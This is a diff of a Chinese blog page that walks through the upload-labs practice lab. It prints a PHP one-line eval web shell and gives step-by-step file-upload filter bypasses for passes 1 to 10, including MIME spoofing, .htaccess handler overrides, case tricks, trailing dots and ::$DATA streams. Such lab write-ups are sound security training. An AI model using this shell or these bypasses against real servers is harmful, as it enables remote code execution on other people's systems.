@@ -8,12 +8,12 @@
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
   <title>upload-labs | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="uplad-labs一句话木马  &lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt; 文件名shell.php">
+  <meta name="description" content="uplad-labs">
 <meta property="og:type" content="article">
 <meta property="og:title" content="upload-labs">
 <meta property="og:url" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/index.html">
 <meta property="og:site_name" content="一路走到黑">
-<meta property="og:description" content="uplad-labs一句话木马  &lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt; 文件名shell.php">
+<meta property="og:description" content="uplad-labs">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p1.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p1s.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p2o.png">
@@ -21,8 +21,13 @@
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p3.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p31.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p4.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p5.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p5s.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p8.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p10.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p101.png">
 <meta property="article:published_time" content="2020-03-29T12:14:36.682Z">
-<meta property="article:modified_time" content="2020-03-29T15:45:25.638Z">
+<meta property="article:modified_time" content="2020-03-31T15:49:43.463Z">
 <meta property="article:author" content="sunzy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p1.png">
@@ -177,16 +182,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="uplad-labs"><a href="#uplad-labs" class="headerlink" title="uplad-labs"></a>uplad-labs</h1><p>一句话木马</p>
-<p> <code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt;</code></p>
-<p>文件名shell.php</p>
-<a id="more"></a>
-
-<h2 id="pass-1"><a href="#pass-1" class="headerlink" title="pass 1"></a>pass 1</h2><p>将文件名后缀改为jpg格式，上传用bp抓包后将后缀改为php上传即可</p>
-<p><img src="/2020/03/29/upload-labs/p1.png" alt></p>
-<p>验证是否成功</p>
+        <h1 id="uplad-labs"><a href="#uplad-labs" class="headerlink" title="uplad-labs"></a>uplad-labs</h1><a id="more"></a>
+<p>一句话木马</p>
+<pre><code>&lt;?php @eval($_REQUEST[&apos;cmd&apos;]); ?&gt;</code></pre><p>文件名shell.php</p>
+<p><strong>pass 1</strong><br><img src="/2020/03/29/upload-labs/p1.png" alt><br>将文件名后缀改为jpg格式上传用bp抓包后将后缀改为php上传<br>验证是否成功</p>
 <p><img src="/2020/03/29/upload-labs/p1s.png" alt></p>
-<h2 id="pass-2"><a href="#pass-2" class="headerlink" title="# pass 2 #"></a># pass 2 #</h2><p><img src="/2020/03/29/upload-labs/p2o.png" alt><br>由代码和提示信息可知，是对MIME类型进行验证</p>
+<p><strong>pass 2</strong></p>
+<p><img src="/2020/03/29/upload-labs/p2o.png" alt><br>由代码和提示信息可知，是对MIME类型进行验证</p>
 <p>超文本标记语言文本.html, . html text/html</p>
 <p>普通文本<code>txt text/plain</code></p>
 <p>RTF文本.<code>rtf application/rtf</code></p>
@@ -201,9 +203,10 @@
 <p>TAR文件<code>.tar application/x-tar</code></p>
 <p><img src="/2020/03/29/upload-labs/p2.png" alt></p>
 <p>访问<a href="http://localhost/upload-labs/upload/shell.php?cmd=phpinfo()" target="_blank" rel="noopener">http://localhost/upload-labs/upload/shell.php?cmd=phpinfo()</a>;<br>成功</p>
-<h2 id="pass-3"><a href="#pass-3" class="headerlink" title="pass 3"></a>pass 3</h2><p>黑名单验证(‘.asp’,’.aspx’,’.php’,’.jsp’)，我们可上传php3,php5,phtml…等这样可以被服务器解析的后缀名<br><img src="/2020/03/29/upload-labs/p3.png" alt></p>
+<p><strong>pass 3</strong></p>
+<p>黑名单验证(‘.asp’,’.aspx’,’.php’,’.jsp’)，我们可上传php3,php5,phtml…等这样可以被服务器解析的后缀名<br><img src="/2020/03/29/upload-labs/p3.png" alt></p>
 <p><img src="/2020/03/29/upload-labs/p31.png" alt></p>
-<h2 id="pass-4"><a href="#pass-4" class="headerlink" title="#  pass 4 #"></a>#  pass 4 #</h2><p>重写文件解析规则绕过。上传先上传一个名为.htaccess文件，内容如下：</p>
+<p>*<em>pass 4 *</em><br>重写文件解析规则绕过。上传先上传一个名为.htaccess文件，内容如下：</p>
 <p>   <code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;</code></p>
 <p>  <code>SetHandler application/x-httpd-php</code></p>
 <p><code>&lt;/FilesMatch&gt;</code></p>
@@ -211,6 +214,27 @@
 <p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
 <p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
 <p>先上传.htaccess,在上传shell.jpg<br>之后访问图片所在的地址<br><img src="/2020/03/29/upload-labs/p4.png" alt></p>
+<p><strong>pass5</strong><br>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+    if (isset($_POST[&apos;submit&apos;])) {
+        if (file_exists(UPLOAD_PATH)) {
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //首尾去空</code></pre><hr>
+<pre><code>$file_ext = strtolower($file_ext); //转换为小写   这句代码没了</code></pre><p>缺少了转换为小写的函数<br>可以将后缀名改为大小写混合绕过<br><img src="/2020/03/29/upload-labs/p5.png" alt><br>查看结果<br><img src="/2020/03/29/upload-labs/p5s.png" alt></p>
+<p><strong>pass6</strong></p>
+<p>利用Windows系统的文件名特性。文件名最后增加空格和点，写成shell.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是shell.php</p>
+<p><strong>pass7</strong><br>文件名后加点和空格，改成shell.php. 。</p>
+<p><strong>pass8</strong></p>
+<p>少了<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>这一句，可以采用Windows文件流特性绕过，文件名改成</p>
+<p>shell.php::$DATA , 上传成功后保存的文件名其实是shell.php<br><img src="/2020/03/29/upload-labs/p8.png" alt></p>
+<p><strong>pass9</strong></p>
+<p>上传文件名后加上点+空格+点，改为shell.php. .<br><img src="/2020/03/29/upload-labs/p10.png" alt><br><strong>pass10</strong></p>
+<p>由于<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>只对文件后缀名进行一次过滤，这样的话，双写文件名绕过，文件名改成shell.pphphp<br><img src="/2020/03/29/upload-labs/p101.png" alt></p>
 
       
 
